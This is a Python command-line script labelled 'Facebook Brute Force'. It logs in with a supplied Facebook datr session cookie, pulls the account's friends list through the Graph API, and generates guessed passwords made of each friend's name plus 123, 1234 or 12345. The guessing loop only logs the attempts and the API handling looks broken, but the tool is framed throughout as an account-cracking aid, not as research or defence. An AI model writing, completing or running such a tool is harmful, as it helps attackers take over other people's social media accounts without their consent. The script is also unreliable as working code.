import requests
from getpass import getpass
from collections import deque
import logging
from rich.console import Console
from rich.table import Table

logging.basicConfig(filename="brute_log.log", level=logging.INFO)

console = Console()
credentials = deque()

class User:
    def __init__(self, id, name):
        self.id = id
        self.name = name.lower()

def get_friends_list(cookies):
    try:
        session = requests.Session()
        session.cookies.update(cookies)
        username = session.get('https://graph.facebook.com/v1.0/me', cookies=cookies).json()['name']
        friends = f"https://graph.facebook.com/v1.0/{username}/friends"
        response = session.get(friends, cookies=cookies).json()
        print(f"Fetched {len(response)} friends for {username}")
        return [User(i['id'], i['name']) for i in response]
    except requests.exceptions.RequestException as e:
        console.log(f"Error: {e}")
        return []

def display_app_logo():
    console.print("[bold yellow]Facebook Brute Force - Bishesh[/bold yellow]\n")

def display_menu():
    console.print("[bold cyan]Please choose an option:[/bold cyan]")
    console.print("[bold white]1. Login through Facebook Cookie[/bold white]")
    console.print("[bold white]2. Logout[/bold white]")
    console.print("[bold white]3. Crack Public Profile (Fetch Friends List and Attempt Passwords)[/bold white]")
    console.print("[bold white]4. Exit[/bold white]")

def login(cookies):
    friends = get_friends_list(cookies)
    if friends:
        console.log("Logged in successfully.")
    else:
        console.log("Login failed. Please check your FB Datr cookie.")
    return friends, cookies

def logout():
    console.log("Logged out from Facebook successfully")

def crack_public_profile(friends):
    if friends is not None:
        username_list = [f.name for f in friends]
        for username in username_list:
            for password_suffix in [123, 1234, 12345]:
                password = username + str(password_suffix)
                console.log(f"Attempting with username: {username}, password: {password}")
    else:
        console.log("You need to login first.")

def main():
    friends = None
    cookies = None

    while True:
        display_app_logo()
        display_menu()
        choice = input("[bold cyan]Enter your choice:[/bold cyan] ")
        
        if choice == "1":
            if cookies is None:
                datr_cookie = getpass("Facebook Datr Cookie: ")
                cookies = {"datr": datr_cookie}
                friends, cookies = login(cookies)
            else:
                console.log("You're already logged in.")
        elif choice == "2":
            if cookies is not None:
                logout()
                friends, cookies = None, None
            else:
                console.log("You are not logged in yet.")
        elif choice == "3":
            crack_public_profile(friends)
        elif choice == "4":
            break
        else:
            console.log("Invalid choice. Please select a valid option.")

if __name__ == "__main__":
    main()
